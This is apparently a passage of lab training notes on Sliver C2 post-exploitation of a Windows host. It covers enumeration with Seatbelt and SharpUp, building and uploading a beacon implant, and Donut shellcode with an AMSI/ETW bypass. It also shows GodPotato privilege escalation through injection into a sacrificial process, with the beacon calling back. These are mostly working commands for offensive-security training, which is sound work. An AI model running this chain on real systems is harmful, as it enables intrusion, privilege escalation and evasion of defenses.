## Aliases and Extensions
#### Enumeration

[Seatbelt](https://github.com/GhostPack/Seatbelt) is a tool used to enumerate the environment written in C# used both by red team operators (professionals) and blue team members to assess the current security posture.

```sh
sliver (HIGH_RISER) > seatbelt -- -group=all
```

The `execute-assembly` command can be used as well for executing .NET binaries that we have compiled. We will use the [SharpCollection](https://github.com/Flangvik/SharpCollection) maintained by Flangvik for demonstration purposes.

```sh
3kjS@htb[/htb]$ git clone https://github.com/Flangvik/SharpCollection
```

To use the `execute-assembly`, we need to specify the full path to the binary`Seatbelt`

```sh
sliver (HIGH_RISER) > execute-assembly /home/htb-ac590/SharpCollection/NetFramework_4.0_Any/Seatbelt.exe -group=system
```

Collecting as much information as possible about the system and the context of the user we are running is crucial. Another tool for enumeration purposes can be used. [SharpUp](https://github.com/GhostPack/SharpUp), which is written in [C#](https://learn.microsoft.com/en-us/dotnet/csharp/), has most of the capabilities of [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1). It's mostly used for enumerating privileges, registries, unquoted service paths, etc.

```sh
sliver (HIGH_RISER) > sharpup -- audit
```

```sh
sliver (HIGH_RISER) > execute-assembly /home/htb-ac590/GodPotato-NET4.exe -cmd "whoami"
```
#### Donut Setup

[Donut](https://github.com/TheWover/donut) is a tool focused on creating binary shellcodes that can be executed in memory; `Donut` will generate a shellcode of a .NET binary, which can be executed via the `execute-shellcode` argument in Sliver.

```sh
3kjS@htb[/htb]$ git clone https://github.com/TheWover/donut
3kjS@htb[/htb]$ cd donut/ 
3kjS@htb[/htb]$ make -f Makefile 
3kjS@htb[/htb]$ ./donut
```

To take advantage of `Donut`, we would need to create either an `http` or `mtls` beacon(s) beforehand.

```sh
sliver (HIGH_RISER) > generate beacon --http 10.10.14.62:9002 --skip-symbols -N http-beacon

[*] Generating new windows/amd64 beacon implant binary (1m0s)
[!] Symbol obfuscation is disabled
[*] Build completed in 3s
[*] Implant saved to /home/htb-ac590/http-beacon.exe
```

```sh
sliver (HIGH_RISER) > upload http-beacon.exe

[*] Wrote file to c:\temp\http-beacon.exe

sliver (HIGH_RISER) > ls

c:\temp (1 item, 9.5 MiB)
=========================
-rw-rw-rw-  http-beacon.exe  9.5 MiB  Mon Oct 16 09:23:48 -0700 2023
```

Right after, we need to start an `HTTP` listener that will listen on port 9002 in Sliver.

```sh
sliver (HIGH_RISER) > http --lhost 10.10.14.62 --lport 9002

[*] Starting HTTP :9002 listener ...
[*] Successfully started job #5
```

To generate the binary shellcode using `Donut`, we are going to be using the arguments `-i` choosing the file to be executed in memory,`-a 2` responsible for choosing the architecture (2 = amd64), the `-b 2` responsible for bypassing AMSI/WLDP/ETW (2 = Abort on fail), `-p` followed by the arguments that are going to be run from `GodPotato` and the `-o` to specify the output directory and the name of the shellcode.

```sh
3kjS@htb[/htb]$ ./donut -i /home/htb-ac590/GodPotato-NET4.exe -a 2 -b 2 -p '-cmd c:\temp\http-beacon.exe' -o /home/htb-ac590/godpotato.bin
```

To continue and use the `execute-shellcode` in memory, we would have to create a sacrificial process of `notepad.exe` using `Rubeus.exe` (previously downloaded from SharpCollection).

```sh
sliver (HIGH_RISER) > execute-assembly /home/htb-ac590/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe
```

Once we have a sacrificial process running, we can use `execute-shellcode` followed by the PID of the sacrificial process and the `payload.bin` generated earlier, allowing us to abuse the `SeImpersonate` privilege of the current user.

```sh
sliver (HIGH_RISER) > execute-shellcode -p 5668 /home/htb-ac590/godpotato.bin
```

After a while, we are notified in `Sliver` of a newly established beacon. We print out the beacons using the `beacons` command.

![](Screenshot%202026-11-04%20at%2013.03.15.png)

```sh
sliver (beacon) > tasks
```
